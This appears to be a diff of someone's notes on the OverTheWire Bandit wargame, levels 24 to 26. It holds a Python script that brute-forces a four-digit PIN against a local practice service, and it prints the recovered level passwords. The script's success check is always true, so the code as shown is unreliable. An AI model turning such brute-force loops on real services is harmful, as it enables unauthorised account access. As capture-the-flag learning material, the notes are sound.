@@ -1,0 +1,54 @@
+bandit 24->25 
+writing a python script to snatch the password if it was correct
+
+import socket
+import sys
+
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+except socket.error:
+    print '[-] FAILED to create socket'
+    sys.exit()
+print 'Socket Created'
+
+host = 'localhost'
+port = 30002
+password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ "
+s.connect((host, port))
+
+print ('[+] Socket connected to ' + host + ' on port ' + str(port))
+data = s.recv(4096)
+
+for i in range(0000, 9999):
+    s.send ( password + str(i).zfill(4) + "\n")
+    data = s.recv(4096)
+    if 'The password'or 'correct' in data:
+        print ( "[+] Found password: " + data + " pin code " + str(i) + " \n" )
+       
+
+
+we get password  
+[+] Found password: Correct!
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+ pin code 5669
+-------------------------------------------
+-------------------------------------------
+-------------------------------------------
+-------------------------------------------
+-------------------------------------------
+-------------------------------------------
+-------------------------------------------
+
+bandit25->26 
+In This level we are given the private key for bandit26 and gven that the default terminal is not bin/bash and that we should investigate what it is.
+
+if you connect like this
+
+ssh -i bandit26_privatekey bandit26@localhost
+it connects to bandit26 and automatically log out back to bandit25
+
+if I try to use getent passwd | grep bandit26
+
+"/home/bandit26/usr/bin/showtext"
+
